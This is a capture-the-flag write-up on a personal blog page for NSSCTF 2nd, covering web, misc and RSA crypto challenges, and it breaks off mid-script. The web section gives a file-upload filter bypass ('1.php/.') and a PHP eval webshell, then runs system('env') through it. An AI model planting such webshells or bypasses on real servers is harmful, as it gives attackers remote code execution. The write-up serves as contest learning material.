@@ -1,0 +1,1292 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>NSSCTF-2nd | C6jU3のblog</title>
+  <meta name="keywords" content=" CTF ">
+  <meta name="description" content="NSSCTF-2nd | C6jU3のblog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#x63;&amp;#103;&amp;#106;&amp;#x75;&amp;#x65;&amp;#x38;&amp;#55;&amp;#x31;&amp;#x40;&amp;#49;&amp;#x36;&amp;#x33;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="关于">
+<meta property="og:url" content="https://blog.cgjue.cn/about/index.html">
+<meta property="og:site_name" content="C6jU3のblog">
+<meta property="og:description" content="欢迎交流刚入坑的萌新，本站所写仅表示个人拙见，如有不当多多担待 联系方式 QQ：417148909 邮箱：&amp;#x63;&amp;#103;&amp;#106;&amp;#x75;&amp;#x65;&amp;#x38;&amp;#55;&amp;#x31;&amp;#x40;&amp;#49;&amp;#x36;&amp;#x33;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-07-16T12:58:30.000Z">
+<meta property="article:modified_time" content="2024-03-05T11:50:05.184Z">
+<meta property="article:author" content="C6jU3">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.png"/>
+</a>
+<div class="author">
+    <span>C6jU3</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://blog.cgjue.cn"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:cgjue871@163.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=417148909&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(28)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="CTF">
+            <i class="fold iconfont icon-right"></i>
+            CTF
+            <small>(20)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY">
+            <i class="fold iconfont icon-right"></i>
+            STUDY
+            <small>(14)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;CRYPTO">
+            <i class="fold iconfont icon-right"></i>
+            CRYPTO
+            <small>(3)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;CRYPTO&lt;---&gt;RSA">
+            
+            RSA
+            <small>(3)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;MISC">
+            <i class="fold iconfont icon-right"></i>
+            MISC
+            <small>(1)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;MISC&lt;---&gt;Godzilla">
+            
+            Godzilla
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;PWN">
+            <i class="fold iconfont icon-right"></i>
+            PWN
+            <small>(1)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;PWN&lt;---&gt;ROP">
+            
+            ROP
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB">
+            <i class="fold iconfont icon-right"></i>
+            WEB
+            <small>(8)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化">
+            <i class="fold iconfont icon-right"></i>
+            反序列化
+            <small>(3)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化&lt;---&gt;反序列化基础">
+            
+            反序列化基础
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化&lt;---&gt;字符串逃逸">
+            
+            字符串逃逸
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;反序列化&lt;---&gt;Phar">
+            
+            Phar
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;JWT">
+            
+            JWT
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;RCE">
+            
+            RCE
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;SSRF">
+            
+            SSRF
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;struts2">
+            
+            struts2
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;STUDY&lt;---&gt;WEB&lt;---&gt;Unicode">
+            
+            Unicode
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="CTF&lt;---&gt;WP">
+            
+            WP
+            <small>(6)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="JAVA">
+            <i class="fold iconfont icon-right"></i>
+            JAVA
+            <small>(1)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="JAVA&lt;---&gt;study">
+            
+            study
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="SOME">
+            <i class="fold iconfont icon-right"></i>
+            SOME
+            <small>(7)</small>
+        </div>
+        
+            <ul class="sub hide">
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;hexo">
+            
+            hexo
+            <small>(2)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;life">
+            
+            life
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;linux">
+            
+            linux
+            <small>(1)</small>
+        </div>
+        
+    </li>
+
+                
+                    
+    <li>
+        <div data-rel="SOME&lt;---&gt;Tools">
+            
+            Tools
+            <small>(3)</small>
+        </div>
+        
+    </li>
+
+                
+            </ul>
+        
+    </li>
+
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="28">
+<input type="hidden" id="yelog_site_word_count" value="50.1k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://blog.shenghuo2.top/">shenghuo2</a></li>
+            
+            <li><a target="_blank" href="http://blog.q1ngchuan.top/">晴川</a></li>
+            
+            <li><a target="_blank" href="https://yhuanhuan01.github.io/">yhuanhuan</a></li>
+            
+            <li><a target="_blank" href="https://shenshuoyaoyouguangha.github.io/">wuming</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>建站</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>crypto</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CTF</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Godzilla</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ROP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>tool</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Unicode</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>unserialize</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>web</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 SOME Tools "
+           href="/2024/03/13/Beautify-Shell/"
+           data-tag="tool"
+           data-author="" >
+            <span class="post-title" title="Beautify_Shell">Beautify_Shell</span>
+            <span class="post-date" title="2024-03-13 16:36:20">2024/03/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2024/03/11/HSCCTF-2024/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HSCCTF#2024">HSCCTF#2024</span>
+            <span class="post-date" title="2024-03-11 18:02:20">2024/03/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME Tools "
+           href="/2024/03/05/qqnt/"
+           data-tag="tool"
+           data-author="" >
+            <span class="post-title" title="NT">NT</span>
+            <span class="post-date" title="2024-03-05 16:12:03">2024/03/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2024/03/04/qsnctf2024-Round-1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="青少年ctf2024#Round_1">青少年ctf2024#Round_1</span>
+            <span class="post-date" title="2024-03-04 18:10:24">2024/03/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB struts2 "
+           href="/2023/11/03/java/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="struts2">struts2</span>
+            <span class="post-date" title="2023-11-03 18:36:25">2023/11/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY PWN ROP "
+           href="/2023/09/16/pwn/"
+           data-tag="ROP"
+           data-author="" >
+            <span class="post-title" title="ROP">ROP</span>
+            <span class="post-date" title="2023-09-16 14:57:02">2023/09/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/09/10/SICTF-2nd/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="SICTF-2nd">SICTF-2nd</span>
+            <span class="post-date" title="2023-09-10 15:15:29">2023/09/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/09/04/nepctf-2023/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="nepctf-2023">nepctf-2023</span>
+            <span class="post-date" title="2023-09-04 19:18:35">2023/09/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/08/29/NSSCTF-2nd/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="NSSCTF-2nd">NSSCTF-2nd</span>
+            <span class="post-date" title="2023-08-29 11:04:56">2023/08/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY MISC Godzilla "
+           href="/2023/08/09/HK/"
+           data-tag="Godzilla"
+           data-author="" >
+            <span class="post-title" title="HK的怪兽">HK的怪兽</span>
+            <span class="post-date" title="2023-08-09 00:36:08">2023/08/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY CRYPTO RSA "
+           href="/2023/08/07/Wilson/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="Wilson">Wilson</span>
+            <span class="post-date" title="2023-08-07 01:59:13">2023/08/07</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB 反序列化 Phar "
+           href="/2023/08/06/Phar/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="Phar">Phar</span>
+            <span class="post-date" title="2023-08-06 12:38:09">2023/08/06</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB Unicode "
+           href="/2023/07/30/checkin/"
+           data-tag="Unicode"
+           data-author="" >
+            <span class="post-title" title="checkin">checkin</span>
+            <span class="post-date" title="2023-07-30 09:56:10">2023/07/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB JWT "
+           href="/2023/07/29/jwtstruts/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="Jwt&amp;struts2">Jwt&amp;struts2</span>
+            <span class="post-date" title="2023-07-29 14:49:15">2023/07/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY CRYPTO RSA "
+           href="/2023/07/23/CRT/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="CRT">CRT</span>
+            <span class="post-date" title="2023-07-23 19:09:47">2023/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB 反序列化 字符串逃逸 "
+           href="/2023/07/23/strout/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化字符串逃逸">PHP反序列化字符串逃逸</span>
+            <span class="post-date" title="2023-07-23 17:48:49">2023/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB 反序列化 反序列化基础 "
+           href="/2023/07/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="unserialize"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化">PHP反序列化</span>
+            <span class="post-date" title="2023-07-23 17:48:49">2023/07/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME Tools "
+           href="/2023/07/22/sagemath/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="Sagemath">Sagemath</span>
+            <span class="post-date" title="2023-07-22 19:45:36">2023/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME linux "
+           href="/2023/07/22/AddSCSI/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="AddSCSI">AddSCSI</span>
+            <span class="post-date" title="2023-07-22 19:44:36">2023/07/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB SSRF "
+           href="/2023/07/18/SSRF/"
+           data-tag="ssrf"
+           data-author="" >
+            <span class="post-title" title="SSRF学习总结">SSRF学习总结</span>
+            <span class="post-date" title="2023-07-18 09:20:58">2023/07/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY WEB RCE "
+           href="/2023/07/18/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="无数字字母rce">无数字字母rce</span>
+            <span class="post-date" title="2023-07-18 09:20:58">2023/07/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME hexo "
+           href="/2023/07/17/fluid/"
+           data-tag="建站"
+           data-author="" >
+            <span class="post-title" title="Fluid">Fluid</span>
+            <span class="post-date" title="2023-07-17 18:00:55">2023/07/17</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME hexo "
+           href="/2023/07/17/hexo/"
+           data-tag="建站"
+           data-author="" >
+            <span class="post-title" title="Hexo+Github">Hexo+Github</span>
+            <span class="post-date" title="2023-07-17 17:24:10">2023/07/17</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY CRYPTO RSA "
+           href="/2023/07/16/00-01/"
+           data-tag="crypto"
+           data-author="" >
+            <span class="post-title" title="低加密指数广播攻击">低加密指数广播攻击</span>
+            <span class="post-date" title="2023-07-16 21:16:52">2023/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 SOME life "
+           href="/2023/07/16/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="萌新">萌新</span>
+            <span class="post-date" title="2023-07-16 21:16:52">2023/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 JAVA study "
+           href="/2023/07/16/javabase/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="JavaStudy">JavaStudy</span>
+            <span class="post-date" title="2023-07-16 21:16:52">2023/07/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF WP "
+           href="/2023/06/04/CISCN-2023/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CISCN#2023">CISCN#2023</span>
+            <span class="post-date" title="2023-06-04 19:06:30">2023/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 CTF STUDY "
+           href="/2023/01/02/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"
+           data-tag="web"
+           data-author="" >
+            <span class="post-title" title="暑假学习路线">暑假学习路线</span>
+            <span class="post-date" title="2023-01-02 09:20:58">2023/01/02</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-NSSCTF-2nd" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">NSSCTF-2nd</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="CTF">CTF</a> > 
+            
+            <a  data-rel="CTF&lt;---&gt;WP">WP</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">CTF</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-03-07 18:48:07'>2023-08-29 11:04</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:509</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSCTF-2nd"><span class="toc-text">NSSCTF 2nd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%AD%BE%E5%88%B0"><span class="toc-text">php签到</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95"><span class="toc-text">上传表单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php"><span class="toc-text">1.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E5%91%A8%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81"><span class="toc-text">2周年快乐！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic-Docker"><span class="toc-text">Magic Docker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gift-in-qrcode"><span class="toc-text">gift_in_qrcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRY"><span class="toc-text">CRY</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EzRSA"><span class="toc-text">EzRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FunnyEncrypt"><span class="toc-text">FunnyEncrypt</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-6 i,
+    .toc-level-6 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="NSSCTF-2nd"><a href="#NSSCTF-2nd" class="headerlink" title="NSSCTF 2nd"></a>NSSCTF 2nd</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="php签到"><a href="#php签到" class="headerlink" title="php签到"></a>php签到</h2><p><strong>filename是经过urldecode过的。因此可以用<code>a.php%2f.</code>来绕过检查</strong></p>
+<h3 id="上传表单"><a href="#上传表单" class="headerlink" title="上传表单"></a>上传表单</h3><p>上传一句话木马</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;POST数据包POC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://node6.anna.nssctf.cn:28552/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;!--链接是当前打开的题目链接--&gt;
+    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><pre><code class="php">&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;
+</code></pre>
+<p>抓包，把文件名改为1.php&#x2F;.</p>
+<p>(url编码)变为%31%2e%70%68%70%2f%2e</p>
+<p>访问&#x2F;1.php，命令执行得到flag</p>
+<pre><code class="php">1=system(&#39;env&#39;);
+</code></pre>
+<h2 id="2周年快乐！"><a href="#2周年快乐！" class="headerlink" title="2周年快乐！"></a>2周年快乐！</h2><p>D盘有暗示,桌面的获取flag</p>
+<p><img src="/img/XMZY3JNSM%60FU3OW1FW@GYJ.jpg"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h2><p>直接 <code>docker run --rm -it randark/nssctf-round15-magic-docker /bin/bash</code> 进bash里cat &#x2F;flag就行了。</p>
+<h2 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift_in_qrcode"></a>gift_in_qrcode</h2><p>有 print(target) ， 所以 cv就行。</p>
+<h1 id="CRY"><a href="#CRY" class="headerlink" title="CRY"></a>CRY</h1><h2 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h2><p> c 很短，并且指数 e &#x3D; 3， 直接尝试开 3 次根即可得到 flag </p>
+<pre><code class="python">import gmpy2
+import libnum
+
+def de(c, e, n):
+    k = 0
+    while True:
+        mm = c + n*k
+        result, flag = gmpy2.iroot(mm, e)
+        if True == flag:
+            return result
+        k += 1
+e= 3
+n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857
+c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077
+
+
+m=de(c,e,n)
+print(m)
+print(libnum.n2s(int(m)).decode())
+</code></pre>
+<pre><code class="python"># sage
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857
+c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077
+m = c.nth_root(3)
+print(long_to_bytes(m))
+</code></pre>
+<h2 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h2><p>统计了一下字符，发现特殊符号刚好 26 个，猜测是 26 个字母进行了替换，直接替换成字母，然后进行频率攻击即可:</p>
+<pre><code class="python">ct = &quot;&quot;&quot;✧✡✭
